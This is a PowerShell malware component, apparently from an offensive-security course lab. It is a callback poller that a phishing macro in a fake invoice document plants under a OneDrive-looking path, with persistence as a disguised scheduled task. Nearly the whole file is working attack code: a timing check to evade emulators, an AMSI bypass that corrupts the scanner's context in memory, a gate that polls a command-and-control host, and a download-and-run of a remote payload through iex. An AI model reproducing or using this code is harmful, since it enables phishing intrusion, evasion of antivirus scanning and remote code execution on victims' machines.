# activate_poller.ps1
# On-demand callback poller. Written to the target as:
#   %APPDATA%\Microsoft\OneDrive\update.ps1
# Registered to run every 5 minutes via scheduled task "OneDriveUpdate".
#
# NOTE: The VBA macro in doc/q4_invoice.vba writes a placeholder for this
# file. Replace the placeholder string with the contents below before saving
# the .docm. See BUILD.md Step 3c.

$ErrorActionPreference = 'SilentlyContinue'

# --- Emulator detection (Mod 11.6.1) ---
$t1 = Get-Date
Start-Sleep -Seconds 2
$t2 = Get-Date
if (($t2 - $t1).TotalSeconds -lt 1.5) { exit }

# --- AMSI bypass — context-structure corruption (Mod 12.3.1) ---
# Locates AmsiUtils dynamically, grabs the amsiContext field, and zeroes the
# first four bytes. AmsiOpenSession then errors out on every subsequent call
# for the lifetime of this PowerShell process.
$a = [Ref].Assembly.GetTypes()
ForEach ($b in $a) { if ($b.Name -like "*iUtils") { $c = $b } }
$d = $c.GetFields('NonPublic,Static')
ForEach ($e in $d) { if ($e.Name -like "*Context") { $f = $e } }
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# --- Activation gate ---
# The C2 returns 200 if /activate exists, 404 otherwise. Only fire when 200.
try {
    $r = Invoke-WebRequest -Uri "http://192.168.119.120/activate" `
        -UseBasicParsing -TimeoutSec 10
    if ($r.StatusCode -ne 200) { exit }
} catch {
    exit
}

# --- Fire the shell ---
$runner = (New-Object System.Net.WebClient).DownloadString(
    'http://192.168.119.120/run.txt'
)
iex $runner
